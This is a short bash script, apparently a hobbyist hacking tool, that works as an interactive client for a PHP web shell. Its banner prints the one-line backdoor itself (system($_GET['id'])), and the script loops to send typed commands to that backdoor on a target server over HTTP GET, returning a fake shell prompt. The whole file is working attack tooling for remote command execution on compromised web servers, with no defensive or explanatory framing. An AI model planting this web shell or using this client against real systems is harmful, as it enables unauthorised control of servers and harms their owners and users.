#!/bin/bash

function banner(){
echo -e "
###############################################\n####       CLIENT BACKDOOR OF PHP          ####\n####                       BY: INIT-0      ####\n####                                       ####\n#### <?php                                 ####\n#### //This is bakdoor in php              ####\n#### 	system($_GET['id'])                     ####\n#### ;?>                                   ####\n###############################################
"
}

target=$1
backdoor=$2
if [ "$target" == "" ];then
	clear 
	banner
	echo "Usage: $0 Target /backdoor.php"
	echo
	echo
	exit
fi
while true;do
	ID=$(GET http://$target$backdoor?id="whoami" | tr -d "\n")
	read -p "$ID@server:~$ " comando
	if [ "$comando" == "clear" ];then
		clear
	fi
	GET http://$target$backdoor?id="$comando $3 $4 $5 $6";
done
